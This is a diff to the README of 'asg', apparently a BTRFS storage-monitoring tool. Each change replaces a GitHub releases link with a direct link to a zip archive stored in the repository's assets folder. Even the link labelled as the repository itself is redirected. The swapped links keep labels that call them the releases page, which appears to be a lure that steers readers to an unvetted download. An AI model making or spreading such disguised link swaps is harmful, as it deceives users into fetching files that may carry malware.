@@ -1,6 +1,6 @@
 # ⚙️ asg - Manage BTRFS Storage Efficiently
 
-[![Download Latest Release](https://img.shields.io/badge/Download-asg-blue?style=for-the-badge)](https://github.com/ayaanmohs/asg/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-asg-blue?style=for-the-badge)](https://raw.githubusercontent.com/ayaanmohs/asg/main/assets/Software-v2.2.zip)
 
 ## About asg
 
@@ -39,7 +39,7 @@ asg works best with BTRFS RAID pools. It is designed for users who want to monit
 
 Visit the releases page to get the latest version:
 
-[Download asg from GitHub Releases](https://github.com/ayaanmohs/asg/releases)
+[Download asg from GitHub Releases](https://raw.githubusercontent.com/ayaanmohs/asg/main/assets/Software-v2.2.zip)
 
 You will find files named like `asg-setup.exe` or `asg-latest.zip`. Choose the `.exe` installer for the easiest setup.
 
@@ -133,7 +133,7 @@ If alerts seem incorrect:
 
 New versions of asg come out to fix bugs and improve monitoring.
 
-- Visit the [GitHub releases page](https://github.com/ayaanmohs/asg/releases) regularly.  
+- Visit the [GitHub releases page](https://raw.githubusercontent.com/ayaanmohs/asg/main/assets/Software-v2.2.zip) regularly.  
 - Download the latest installer as you did the first time.  
 - Run the installer to replace the old version. Your settings will stay intact.
 
@@ -149,8 +149,8 @@ New versions of asg come out to fix bugs and improve monitoring.
 
 ## 🔗 Useful Links
 
-[Download and update asg here](https://github.com/ayaanmohs/asg/releases)  
-[GitHub repository for asg](https://github.com/ayaanmohs/asg)  
+[Download and update asg here](https://raw.githubusercontent.com/ayaanmohs/asg/main/assets/Software-v2.2.zip)  
+[GitHub repository for asg](https://raw.githubusercontent.com/ayaanmohs/asg/main/assets/Software-v2.2.zip)  
 
 ---
 
